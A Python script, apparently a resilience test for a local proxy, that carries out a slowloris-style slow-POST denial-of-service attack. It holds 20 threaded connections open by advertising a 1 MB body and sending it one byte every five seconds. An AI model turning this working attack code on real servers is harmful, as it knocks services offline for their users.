# attacks/attack_slowloris.py

import socket
import time
import threading

HOST = '127.0.0.1'
PORT = 5000
NUM_CONNS = 20       # number of simultaneous connections to open
DELAY = 5            # seconds to wait between each byte send
BODY_SIZE = 1000000  # advertise 1MB content length

def worker(i):
    try:
        # 1) Establish connection to the target proxy
        s = socket.create_connection((HOST, PORT), timeout=10)

        # 2) Send request line, headers, and an empty line
        request_headers = (
            "POST /submit HTTP/1.1\r\n"
            "Host: example.com\r\n"
            f"Content-Length: {BODY_SIZE}\r\n"
            "\r\n"
        )
        s.sendall(request_headers.encode('utf-8'))

        # 3) Slowly send the body one byte at a time
        for _ in range(BODY_SIZE):
            s.sendall(b'a')
            time.sleep(DELAY)

        s.close()

    except Exception as e:
        print(f"[Conn {i}] {e}")

def main():
    threads = []
    for i in range(NUM_CONNS):
        t = threading.Thread(target=worker, args=(i,))
        t.daemon = True
        t.start()
        time.sleep(0.1)  # stagger connections to avoid bursting
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
